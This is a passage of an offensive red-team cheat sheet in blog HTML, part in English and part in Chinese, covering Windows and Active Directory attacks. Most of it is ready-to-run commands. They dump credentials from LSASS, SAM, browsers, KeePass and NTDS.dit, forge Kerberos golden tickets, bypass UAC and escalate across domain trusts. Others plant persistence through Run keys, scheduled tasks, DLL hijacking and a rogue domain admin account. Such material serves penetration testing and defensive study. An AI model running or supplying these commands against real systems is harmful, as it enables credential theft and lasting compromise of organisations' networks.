class="line">Mimikatz Guide</span><br><span class="line"></span><br><span class="line">#Logon Sessions</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords all</span><br><span class="line"></span><br><span class="line">#Dump Cache</span><br><span class="line"></span><br><span class="line">lsadump::cache</span><br><span class="line"></span><br><span class="line">#Dump SAM</span><br><span class="line"></span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h2 id="5-6-Dump-Creds-2"><a href="#5-6-Dump-Creds-2" class="headerlink" title="5.6 Dump Creds #2"></a>5.6 Dump Creds #2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/AlessandroZ/LaZagne</span><br><span class="line"></span><br><span class="line">laZagne.exe all</span><br><span class="line">laZagne.exe browsers</span><br><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure><h2 id="5-7-SessionGopher"><a href="#5-7-SessionGopher" class="headerlink" title="5.7 SessionGopher"></a>5.7 SessionGopher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Arvanaghi/SessionGopher</span><br><span class="line"></span><br><span class="line">Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP</span><br><span class="line"></span><br><span class="line">SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals</span><br><span class="line"></span><br><span class="line">Invoke-SessionGopher -Thorough</span><br><span class="line"></span><br><span class="line">Import-Module path\to\SessionGopher.ps1;</span><br><span class="line">Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss</span><br></pre></td></tr></table></figure><h2 id="5-8-Dump-Chrome密码（也发布漏洞利用程序）"><a href="#5-8-Dump-Chrome密码（也发布漏洞利用程序）" class="headerlink" title="5.8 Dump Chrome密码（也发布漏洞利用程序）"></a>5.8 Dump Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="5-9-Dump-Process-Memory-w-Mimikittenz"><a href="#5-9-Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="5.9 Dump Process Memory w/ Mimikittenz"></a>5.9 Dump Process Memory w/ Mimikittenz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/putterpanda/mimikittenz</span><br><span class="line"></span><br><span class="line">mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</span><br><span class="line"></span><br><span class="line">The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.</span><br><span class="line"></span><br><span class="line">Invoke-Mimikittenz</span><br></pre></td></tr></table></figure><h2 id="5-10-Dump-KeePass"><a href="#5-10-Dump-KeePass" class="headerlink" title="5.10 Dump KeePass"></a>5.10 Dump KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="5-11-pypykatz"><a href="#5-11-pypykatz" class="headerlink" title="5.11 pypykatz"></a>5.11 pypykatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/pypykatz</span><br><span class="line"></span><br><span class="line">Full python implementation of Mimikatz :D </span><br><span class="line"></span><br><span class="line">pip3 install pypykatz</span><br></pre></td></tr></table></figure><h2 id="5-12-SafetyKatz"><a href="#5-12-SafetyKatz" class="headerlink" title="5.12 SafetyKatz"></a>5.12 SafetyKatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SafetyKatz</span><br><span class="line"></span><br><span class="line">Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D </span><br><span class="line"></span><br><span class="line">&quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&apos;s .NET PE Loader.</span><br><span class="line"></span><br><span class="line">First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot;</span><br></pre></td></tr></table></figure><h2 id="5-13-SharpDPAPI"><a href="#5-13-SharpDPAPI" class="headerlink" title="5.13 SharpDPAPI"></a>5.13 SharpDPAPI</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpDPAPI</span><br><span class="line"></span><br><span class="line">Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.</span><br></pre></td></tr></table></figure><h2 id="5-14-SharpSniper"><a href="#5-14-SharpSniper" class="headerlink" title="5.14 SharpSniper"></a>5.14 SharpSniper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HunnicCyber/SharpSniper</span><br><span class="line"></span><br><span class="line">Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.</span><br><span class="line"></span><br><span class="line">SharpSniper is a simple tool to find the IP address of these users so that you can target their box.</span><br><span class="line"></span><br><span class="line">C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123</span><br><span class="line"></span><br><span class="line">User: emusk - IP Address: 192.168.37.130</span><br></pre></td></tr></table></figure><h2 id="5-15-SharpLocker"><a href="#5-15-SharpLocker" class="headerlink" title="5.15 SharpLocker"></a>5.15 SharpLocker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Pickfordmatt/SharpLocker</span><br><span class="line"></span><br><span class="line">SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.</span><br></pre></td></tr></table></figure><h2 id="5-16-Check-for-Missing-KB’s"><a href="#5-16-Check-for-Missing-KB’s" class="headerlink" title="5.16 Check for Missing KB’s"></a>5.16 Check for Missing KB’s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watson.exe</span><br><span class="line">Sherlock.ps1</span><br><span class="line"></span><br><span class="line">Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. </span><br><span class="line"></span><br><span class="line">More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)</span><br><span class="line"></span><br><span class="line">https://github.com/rasta-mouse/Watson</span><br></pre></td></tr></table></figure><h2 id="5-17-如果管理员-系统，则使用Mimikatz解密EFS文件"><a href="#5-17-如果管理员-系统，则使用Mimikatz解密EFS文件" class="headerlink" title="5.17 如果管理员/系统，则使用Mimikatz解密EFS文件"></a>5.17 如果管理员/系统，则使用Mimikatz解密EFS文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</span><br><span class="line"></span><br><span class="line">cipher /c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.</span><br><span class="line"></span><br><span class="line">privilege::debug </span><br><span class="line">token::elevate </span><br><span class="line">crypto::system /file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /export</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;</span><br><span class="line"></span><br><span class="line">dpapi::masterkey /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b</span><br><span class="line"></span><br><span class="line">openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem</span><br><span class="line"></span><br><span class="line">openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br><span class="line"></span><br><span class="line">certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot</span><br></pre></td></tr></table></figure><h2 id="5-18-UAC绕过"><a href="#5-18-UAC绕过" class="headerlink" title="5.18 UAC绕过"></a>5.18 UAC绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info </span><br><span class="line"></span><br><span class="line">findstr /C:&quot;&lt;autoElevate&gt;true&quot; </span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesRemote.exe</span><br></pre></td></tr></table></figure><h2 id="5-19-Golden-Ticket-Attack"><a href="#5-19-Golden-Ticket-Attack" class="headerlink" title="5.19 Golden Ticket Attack"></a>5.19 Golden Ticket Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line"># To generate the TGT with NTLM</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 128 key</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># Inject TGT with Mimikatz</span><br><span class="line">mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Inject Ticket with Rebeus</span><br><span class="line">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd</span><br></pre></td></tr></table></figure><h2 id="5-20-子域将危害森林"><a href="#5-20-子域将危害森林" class="headerlink" title="5.20 子域将危害森林"></a>5.20 子域将危害森林</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC</span><br><span class="line"></span><br><span class="line">Tree = Set of domains using same name space (DNS Name)</span><br><span class="line"></span><br><span class="line">Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.</span><br><span class="line"></span><br><span class="line">Forest = Largest Structure composed of all trees.</span><br><span class="line"></span><br><span class="line">Most trees are linked with dual sided trust relationships to allow for sharing of resources.</span><br><span class="line"></span><br><span class="line">By default the first domain created if the Forest Root.</span><br><span class="line"></span><br><span class="line">Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create </span><br><span class="line"></span><br><span class="line">Covert-NameToSid target.domain.com\krbtgt</span><br><span class="line">S-1-5-21-2941561648-383941485-1389968811-502</span><br><span class="line"></span><br><span class="line">Replace 502 with 519 to represent Enterprise Admins</span><br><span class="line"></span><br><span class="line">Create golden ticket and attack parent domain. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This will not work if there is SID Filtering in place for respective target domain.</span><br><span class="line"></span><br><span class="line">harmj0ys article explains it best. </span><br><span class="line"></span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</span><br></pre></td></tr></table></figure><h2 id="5-21-Dump-NTDS-dit"><a href="#5-21-Dump-NTDS-dit" class="headerlink" title="5.21 Dump NTDS.dit"></a>5.21 Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\vssadmin create shadow /for=C:</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM</span><br><span class="line">.</span><br><span class="line">reg SAVE HKLM\SYSTEM c:\SYS</span><br><span class="line">vssadmin delete shadows /for= [/oldest | /all | /shadow=]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit</span><br></pre></td></tr></table></figure><h2 id="5-22-SeBackupPrivlege-Dump-NTDS-dit"><a href="#5-22-SeBackupPrivlege-Dump-NTDS-dit" class="headerlink" title="5.22 SeBackupPrivlege - Dump NTDS.dit"></a>5.22 SeBackupPrivlege - Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is disabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Set-SeBackupPrivilege</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is enabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite</span><br><span class="line">Copied 12582912 bytes</span><br><span class="line"></span><br><span class="line">Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit </span><br><span class="line"></span><br><span class="line">Remember and not use C:\Windows\ntds\ntds.dit</span><br><span class="line"></span><br><span class="line">reg.exe save hklm\system c:\m0chan\SYSTEM.bak</span><br></pre></td></tr></table></figure><h1 id="0x06-权限维持"><a href="#0x06-权限维持" class="headerlink" title="0x06 权限维持"></a>0x06 权限维持</h1><h2 id="6-1-SSH-Shuttle"><a href="#6-1-SSH-Shuttle" class="headerlink" title="6.1 SSH Shuttle"></a>6.1 SSH Shuttle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot;</span><br></pre></td></tr></table></figure><h2 id="6-2-SharPersist"><a href="#6-2-SharPersist" class="headerlink" title="6.2 SharPersist"></a>6.2 SharPersist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/fireeye/SharPersist</span><br><span class="line"></span><br><span class="line">C# Libary Designed by FireEye to aid with Persistance using various techniques such as </span><br><span class="line"></span><br><span class="line">KeePass Backdoor</span><br><span class="line">Reg Key</span><br><span class="line">Sch Task Backdoor</span><br><span class="line">Startup Folder (Link File)</span><br><span class="line">Service Backdoor</span><br><span class="line"></span><br><span class="line">See there github linked above for full Syntax, very cool work</span><br></pre></td></tr></table></figure><h2 id="6-3-SharpDoor"><a href="#6-3-SharpDoor" class="headerlink" title="6.3 SharpDoor"></a>6.3 SharpDoor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/SharpDoor.git</span><br><span class="line"></span><br><span class="line">SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.</span><br><span class="line"></span><br><span class="line">execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe</span><br></pre></td></tr></table></figure><h2 id="6-4-自动运行注册表"><a href="#6-4-自动运行注册表" class="headerlink" title="6.4 自动运行注册表"></a>6.4 自动运行注册表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br></pre></td></tr></table></figure><h2 id="6-5-Run-amp-Run-Once"><a href="#6-5-Run-amp-Run-Once" class="headerlink" title="6.5 Run &amp; Run Once"></a>6.5 Run &amp; Run Once</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v WindowsUpdate</span><br><span class="line">/t REG_SZ /d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="6-6-计划任务"><a href="#6-6-计划任务" class="headerlink" title="6.6 计划任务"></a>6.6 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.</span><br><span class="line"></span><br><span class="line">schtasks /create /sc minute /mo 1 /tn &quot;Malware&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe</span><br><span class="line"></span><br><span class="line">This will run Malware.exe every minute forever.</span><br><span class="line"></span><br><span class="line"># Run Malware.exe every day at 06:00am</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00</span><br><span class="line"></span><br><span class="line"># Runs a task each time the user&apos;s session is idle for 5 minutes.</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5</span><br><span class="line"></span><br><span class="line"># Runs a a task as SYSTEM when User Logs in.</span><br><span class="line">schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon</span><br></pre></td></tr></table></figure><h2 id="6-7-Windows启动文件夹"><a href="#6-7-Windows启动文件夹" class="headerlink" title="6.7 Windows启动文件夹"></a>6.7 Windows启动文件夹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This has been around for years as basically every version of Windows contains a startup folder. </span><br><span class="line"></span><br><span class="line">Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line"></span><br><span class="line">Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="6-8-EXE-DLL劫持"><a href="#6-8-EXE-DLL劫持" class="headerlink" title="6.8 EXE / DLL劫持"></a>6.8 EXE / DLL劫持</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Look for any missing DLL&apos;s or EXE&apos;s that common programs are calling on startup and over write them with your payload/malware.</span><br><span class="line"></span><br><span class="line">Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&apos;t break the execution.</span><br></pre></td></tr></table></figure><h2 id="6-9-添加用户帐号"><a href="#6-9-添加用户帐号" class="headerlink" title="6.9 添加用户帐号"></a>6.9 添加用户帐号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; m0chan /add /domain</span><br><span class="line">net localgroup &quot;Administrators&quot; /add</span><br><span class="line">net user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot;</span><br></pre></td></tr></table></figure><h4 id="6-10-Kerberos的持久性"><a href="#6-10-Kerberos的持久性" class="headerlink" title="6.10 Kerberos的持久性"></a>6.10 Kerberos的持久性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 